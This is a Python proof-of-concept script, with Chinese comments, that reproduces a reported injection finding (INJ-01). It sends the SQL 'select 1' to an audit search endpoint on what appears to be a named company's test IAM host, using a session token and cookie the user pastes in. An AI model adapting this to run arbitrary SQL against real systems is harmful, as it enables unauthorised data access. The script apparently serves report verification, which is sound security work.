#!/usr/bin/env python3
"""使用当前登录会话复现报告 INJ-01 的 select 1 请求。"""

import json
import re
import sys
import urllib.error
import urllib.request


URL = "https://iam-uat.immotors.com/esc-audit/audit/search-review"
GWSID = "GWSID-iam-uat.immotors.com"
PAYLOAD = {
    "searchType": "QUERY_SQL",
    "dataSource": "JDBC_MYSQL",
    "searchTemplate": "select 1",
}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def unquote(value):
    value = value.strip()
    if len(value) >= 2 and value[0] == value[-1] and value[0] in "\"'":
        return value[1:-1].strip()
    return value


def read_credentials():
    token = unquote(input("粘贴 Token（可带 Authorization: Bearer 前缀），按回车：\n"))
    token = re.sub(r"^Authorization\s*:\s*", "", token, flags=re.I)
    token = re.sub(r"^Bearer\s+", "", token, flags=re.I).strip()
    if not token or re.search(r"\s", token):
        raise ValueError("Token 为空或包含空白，请复制完整的 Token 值。")

    print("\n粘贴完整 Cookie（可带 Cookie: 前缀，可多行）。")
    print("粘贴完成后，在空白行再按一次回车：")
    lines = []
    while True:
        line = input()
        if not line.strip():
            break
        lines.append(line.strip())
    cookie = unquote("".join(lines))
    cookie = re.sub(r"^Cookie\s*:\s*", "", cookie, flags=re.I)

    # 修正此前把完整 Cookie 放在额外 GWSID= 后面的粘贴方式。
    if cookie.startswith(GWSID + "=gwimmotors="):
        cookie = cookie[len(GWSID) + 1:]
        print("已清理完整 Cookie 前面多余的 GWSID= 前缀。")

    names = set()
    for part in cookie.split(";"):
        if not part.strip():
            continue
        name, separator, value = part.strip().partition("=")
        if not separator or not name or re.search(r"\s", name):
            raise ValueError("Cookie 格式错误，请复制请求头 Cookie: 后的完整内容。")
        if name in names:
            raise ValueError("Cookie 包含重复名称，请重新复制浏览器的完整 Cookie 请求头。")
        names.add(name)
        if name == GWSID and (not value or value.startswith("gwimmotors=")):
            raise ValueError("GWSID 值不正确，请检查是否多加了 GWSID= 前缀。")
    if GWSID not in names:
        raise ValueError("Cookie 中没有 GWSID-iam-uat.immotors.com，请从成功请求中重新复制。")
    if any(ord(c) < 32 or ord(c) > 126 for c in token + cookie):
        raise ValueError("凭据包含异常字符，请复制原始请求头中的值。")
    return token, cookie


def main():
    print("IAM 报告 INJ-01 复现：固定执行 select 1")
    print("请使用同一个浏览器当前登录会话的 Token 和 Cookie。\n")
    token, cookie = read_credentials()
    request = urllib.request.Request(
        URL,
        data=json.dumps(PAYLOAD).encode("utf-8"),
        headers={
            "Authorization": "Bearer " + token,
            "Cookie": cookie,
            "Content-Type": "application/json",
            "Accept": "application/json",
        },
        method="POST",
    )
    print("\n正在发送请求……")
    opener = urllib.request.build_opener(NoRedirect())
    try:
        response = opener.open(request, timeout=30)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        status = response.code
        location = response.headers.get("Location")
        charset = response.headers.get_content_charset() or "utf-8"
        body = response.read().decode(charset, errors="replace")
    print("\nHTTP 状态：", status)
    if location:
        print("跳转地址：", location)
    parsed = None
    try:
        parsed = json.loads(body)
        if isinstance(parsed, str):
            parsed = json.loads(parsed)
    except (ValueError, TypeError):
        pass
    print("响应内容：")
    print(json.dumps(parsed, ensure_ascii=False, indent=2) if parsed is not None else body)
    if 300 <= status < 400:
        print("\n请求被重定向；若跳转到 SSO 登录，请重新获取同一会话的 Token 和 Cookie。")
    elif status in (401, 403):
        print("\n请求被拒绝，请检查当前会话、Token 和账户权限。")
    elif status == 200 and isinstance(parsed, dict) and parsed.get("result") in (
        [{"1": "1"}], [{"1": 1}],
    ):
        print("\nselect 1 返回了预期结果，与报告中的基础复现结果一致。")
    else:
        print("\n请根据响应内容判断结果；HTTP 200 本身不能证明复现成功。")
    return 0 if status == 200 else 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except (EOFError, KeyboardInterrupt):
        print("\n输入已取消。", file=sys.stderr)
        sys.exit(1)
    except ValueError as error:
        print("\n输入或响应格式错误：", error, file=sys.stderr)
        sys.exit(1)
    except (urllib.error.URLError, OSError) as error:
        print("\n连接失败：", error, file=sys.stderr)
        sys.exit(1)
